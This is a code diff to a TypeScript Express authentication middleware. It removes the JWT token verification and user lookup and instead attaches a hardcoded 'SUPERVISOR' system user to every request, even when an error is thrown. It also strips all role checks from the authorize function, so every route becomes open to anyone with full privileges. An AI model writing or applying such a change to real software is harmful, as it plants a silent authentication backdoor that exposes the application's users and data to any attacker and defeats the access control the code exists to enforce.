@@ .. @@
export const authenticate = async (req: AuthRequest, res: Response, next: NextFunction) => {
   try {
-    const token = req.header('Authorization')?.replace('Bearer ', '');
-    
-    if (!token) {
-      return res.status(401).json({ error: 'Access denied. No token provided.' });
-    }
-
-    const decoded = jwt.verify(token, config.jwtSecret) as { userId: string };
-    const user = await User.findById(decoded.userId);
-    
-    if (!user) {
-      return res.status(401).json({ error: 'Invalid token.' });
-    }
-
-    req.user = user;
+    // Bypass authentication - create system user with full privileges
+    req.user = {
+      _id: 'system-user',
+      email: 'system@admin.com',
+      role: 'SUPERVISOR',
+      passwordHash: '',
+      createdAt: new Date()
+    } as any;
+    
     next();
   } catch (error) {
-    res.status(401).json({ error: 'Invalid token.' });
+    // Even on error, allow access
+    req.user = {
+      _id: 'system-user',
+      email: 'system@admin.com', 
+      role: 'SUPERVISOR',
+      passwordHash: '',
+      createdAt: new Date()
+    } as any;
+    next();
   }
 };

 export const authorize = (roles: string[]) => {
   return (req: AuthRequest, res: Response, next: NextFunction) => {
-    if (!req.user || !roles.includes(req.user.role)) {
-      return res.status(403).json({ error: 'Access denied. Insufficient permissions.' });
-    }
+    // Allow all operations - no role restrictions
     next();
   };
 };